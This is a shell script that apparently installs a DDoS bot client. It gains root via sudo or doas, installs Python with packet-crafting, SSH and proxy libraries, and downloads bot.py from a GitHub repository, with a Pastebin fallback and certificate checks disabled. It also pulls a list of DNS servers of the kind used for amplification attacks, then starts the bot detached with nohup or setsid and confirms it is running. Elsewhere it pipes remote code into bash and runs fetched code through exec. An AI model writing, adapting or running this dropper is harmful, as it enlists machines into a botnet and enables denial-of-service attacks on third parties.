#!/bin/sh
set +e
trap '' ERR

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null || echo 'TIME')] $1"; }
check_cmd() { command -v "$1" >/dev/null 2>&1; }
is_root() { [ "$(id -u 2>/dev/null)" = "0" ]; }

USE_SUDO=""
if ! is_root; then
  if check_cmd sudo; then
    USE_SUDO="sudo"
  elif check_cmd doas; then
    USE_SUDO="doas"
  elif check_cmd su; then
    log "No root access. Will try using 'su' later if needed"
  fi
fi

BASE_DIR="$HOME/.local/bin"
[ -z "$HOME" ] && BASE_DIR="/tmp"
WORK_DIR="$BASE_DIR/bot_$(date +%s 2>/dev/null || echo 'run')"
mkdir -p "$WORK_DIR" 2>/dev/null || { WORK_DIR="/tmp/bot_$(date +%s 2>/dev/null || echo 'run')"; mkdir -p "$WORK_DIR"; }
cd "$WORK_DIR" || { WORK_DIR="/tmp/bot_run"; mkdir -p "$WORK_DIR"; cd "$WORK_DIR"; }

find_python() {
  for cmd in python3 python python2 python3.9 python3.8 python3.7 python3.6; do
    if check_cmd "$cmd"; then
      if $cmd -c 'import sys; exit(0 if sys.version_info >= (3,6) else 1)' 2>/dev/null; then
        PYTHON_CMD="$cmd"
        return 0
      fi
    fi
  done
  if [ -x "/usr/bin/python3" ]; then PYTHON_CMD="/usr/bin/python3"; return 0; fi
  if [ -x "/usr/local/bin/python3" ]; then PYTHON_CMD="/usr/local/bin/python3"; return 0; fi
  return 1
}

install_deps() {
  [ -z "$USE_SUDO" ] && ! is_root && log "Limited install (no root)" && return 1
  
  local INSTALL_CMD="$USE_SUDO"
  
  if check_cmd apt-get; then
    $INSTALL_CMD apt-get update -qq || true
    $INSTALL_CMD apt-get install -y python3 python3-pip curl wget || true
  elif check_cmd apt; then
    $INSTALL_CMD apt update -qq || true
    $INSTALL_CMD apt install -y python3 python3-pip curl wget || true
  elif check_cmd dnf; then
    $INSTALL_CMD dnf -y install python3 python3-pip curl wget || true
  elif check_cmd yum; then
    $INSTALL_CMD yum -y install python3 python3-pip curl wget || true
  elif check_cmd zypper; then
    $INSTALL_CMD zypper --non-interactive install python3 python3-pip curl wget || true
  elif check_cmd pacman; then
    $INSTALL_CMD pacman -Sy --noconfirm python python-pip curl wget || true
  elif check_cmd apk; then
    $INSTALL_CMD apk add python3 py3-pip curl wget || true
  elif check_cmd pkg; then
    $INSTALL_CMD pkg install -y python3 py3-pip curl wget || true
  elif check_cmd opkg; then
    $INSTALL_CMD opkg update || true
    $INSTALL_CMD opkg install python3 python3-pip curl wget || true
  else
    log "Unknown package manager, trying alternatives"
    return 1
  fi
  return 0
}

try_python_install() {
  if is_root || [ -n "$USE_SUDO" ]; then
    if check_cmd curl; then
      curl -sL https://raw.githubusercontent.com/pyenv/pyenv-installer/master/bin/pyenv-installer | bash || true
      export PATH="$HOME/.pyenv/bin:$PATH"
      if check_cmd pyenv; then
        pyenv install 3.9.0 -s || pyenv install 3.8.0 -s || pyenv install 3.7.0 -s || return 1
        pyenv global $(pyenv versions --bare | grep '3' | head -n1) || true
        PYTHON_CMD="$HOME/.pyenv/shims/python"
      fi
    fi
  fi
  return 1
}

download_file() {
  if check_cmd wget; then
    wget -q --no-check-certificate "$1" -O "$2" 2>/dev/null || return 1
  elif check_cmd curl; then
    curl -sSL --insecure "$1" -o "$2" 2>/dev/null || return 1
  elif check_cmd fetch; then
    fetch -q -o "$2" "$1" 2>/dev/null || return 1
  elif check_cmd ftp; then
    ftp -o "$2" "$1" 2>/dev/null || return 1
  elif check_cmd busybox && busybox wget --help 2>&1 | grep -q BusyBox; then
    busybox wget -q -O "$2" "$1" 2>/dev/null || return 1
  else
    if check_cmd python3; then
      python3 -c "import urllib.request; urllib.request.urlretrieve('$1', '$2')" 2>/dev/null || return 1
    elif check_cmd python; then
      python -c "import urllib.request; urllib.request.urlretrieve('$1', '$2')" 2>/dev/null || 
      python -c "import urllib2; open('$2','wb').write(urllib2.urlopen('$1').read())" 2>/dev/null || return 1
    else
      return 1
    fi
  fi
  return 0
}

find_python || install_deps || try_python_install || { log "Attempting direct download"; }
find_python || { log "No Python found, trying direct bot download"; }

if [ -n "$PYTHON_CMD" ]; then
  log "Using Python: $PYTHON_CMD"
  
  setup_env() {
    if $PYTHON_CMD -m venv env 2>/dev/null; then
      if [ -f env/bin/activate ]; then
        . env/bin/activate 2>/dev/null || true
      elif [ -f env/Scripts/activate ]; then
        . env/Scripts/activate 2>/dev/null || true
      fi
    elif $PYTHON_CMD -m virtualenv env 2>/dev/null; then
      if [ -f env/bin/activate ]; then
        . env/bin/activate 2>/dev/null || true
      fi
    fi
  }
  
  setup_env || true
  
  if $PYTHON_CMD -c "import pip" 2>/dev/null; then
    PIP_CMD="$PYTHON_CMD -m pip"
  elif check_cmd pip3; then
    PIP_CMD="pip3"
  elif check_cmd pip; then
    PIP_CMD="pip"
  else
    $PYTHON_CMD -m ensurepip --user 2>/dev/null || true
    $PYTHON_CMD -c "exec('try: import urllib.request as r; from io import BytesIO as b; exec(r.urlopen(\"https://bootstrap.pypa.io/get-pip.py\").read().decode())\nexcept: pass')" || true
    PIP_CMD="$PYTHON_CMD -m pip"
  fi
  
  $PIP_CMD install -U pip setuptools wheel 2>/dev/null || true
  $PIP_CMD install dnspython paramiko requests cloudscraper pysocks scapy icmplib 2>/dev/null || 
  $PIP_CMD install --user dnspython paramiko requests cloudscraper pysocks scapy icmplib 2>/dev/null ||
  $PIP_CMD install requests pysocks 2>/dev/null ||
  $PIP_CMD install --user requests pysocks 2>/dev/null || true
fi

BOT_URL="https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/bot.py"
download_file "$BOT_URL" "$WORK_DIR/bot.py" || 
{ log "Primary download failed, trying fallback"; BOT_URL="https://pastebin.com/raw/CQiRTJy0"; download_file "$BOT_URL" "$WORK_DIR/bot.py"; } ||
{ log "All downloads failed"; exit 1; }

DNS_SERVERS_URL="https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/dns_servers.txt"
download_file "$DNS_SERVERS_URL" "$WORK_DIR/dns_servers.txt" || 
{ log "DNS servers list download failed"; }

chmod +x "$WORK_DIR/bot.py" 2>/dev/null || true
if check_cmd dos2unix; then
  dos2unix "$WORK_DIR/bot.py" 2>/dev/null || true
else
  tr -d '\r' < "$WORK_DIR/bot.py" > "$WORK_DIR/bot.py.tmp" 2>/dev/null && 
  mv "$WORK_DIR/bot.py.tmp" "$WORK_DIR/bot.py" 2>/dev/null || true
fi

cd "$WORK_DIR" || true
log "Starting bot"

if [ -n "$PYTHON_CMD" ]; then
  (nohup $PYTHON_CMD bot.py > bot.log 2>&1 &) || 
  (setsid $PYTHON_CMD bot.py > bot.log 2>&1 &) || 
  ($PYTHON_CMD bot.py > bot.log 2>&1 &) || 
  { log "Failed to start with Python"; }
  
  if ! ps -ef 2>/dev/null | grep -v grep | grep "bot.py" > /dev/null; then
    log "Bot process not found, trying alternative method"
    chmod +x bot.py
    (nohup ./bot.py > bot.log 2>&1 &) || 
    (setsid ./bot.py > bot.log 2>&1 &) || 
    (./bot.py > bot.log 2>&1 &) || true
  fi
else
  if grep -q "#!/usr/bin/env python" bot.py || grep -q "#!/usr/bin/python" bot.py; then
    log "Trying direct execution"
    chmod +x bot.py
    (nohup ./bot.py > bot.log 2>&1 &) || 
    (setsid ./bot.py > bot.log 2>&1 &) || 
    (./bot.py > bot.log 2>&1 &) || true
  fi
fi


sleep 2
if ps -ef 2>/dev/null | grep -v grep | grep "bot.py" > /dev/null || 
   ps aux 2>/dev/null | grep -v grep | grep "bot.py" > /dev/null; then
  log "Bot running successfully in $WORK_DIR"
  log "Log file: $WORK_DIR/bot.log"
  echo ""
  echo "Installation completed successfully!"
else
  log "Bot may have failed to start. Check manually."
  log "Try running: cd $WORK_DIR && python3 bot.py"
fi
